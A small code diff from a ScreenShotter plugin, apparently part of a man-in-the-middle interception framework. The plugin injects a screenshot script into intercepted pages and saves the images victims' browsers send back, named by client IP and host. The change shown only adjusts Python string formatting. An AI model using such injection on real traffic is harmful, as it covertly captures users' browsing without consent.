@@ -42,15 +42,15 @@ class ScreenShotter(Inject, Plugin):
             request.handle_post_output = True
 
             client = request.client.getClientIP()
-            img_file = '{}-{}-{}.png'.format(client, request.headers['host'], datetime.now().strftime("%Y-%m-%d_%H:%M:%S:%s"))
+            img_file = '{0}-{1}-{2}.png'.format(client, request.headers['host'], datetime.now().strftime("%Y-%m-%d_%H:%M:%S:%s"))
             try:
                 with open('./logs/' + img_file, 'wb') as img:
                     img.write(base64.b64decode(urllib.unquote(request.postData).decode('utf8').split(',')[1]))
                     img.close()
 
-                self.clientlog.info('Saved screenshot to {}'.format(img_file), extra=request.clientInfo)
+                self.clientlog.info('Saved screenshot to {0}'.format(img_file), extra=request.clientInfo)
             except Exception as e:
-                self.clientlog.error('Error saving screenshot: {}'.format(e), extra=request.clientInfo)
+                self.clientlog.error('Error saving screenshot: {0}'.format(e), extra=request.clientInfo)
 
     def get_payload(self):
         return re.sub("SECONDS_GO_HERE", str(self.interval*1000), open("./core/javascript/screenshot.js", "rb").read())
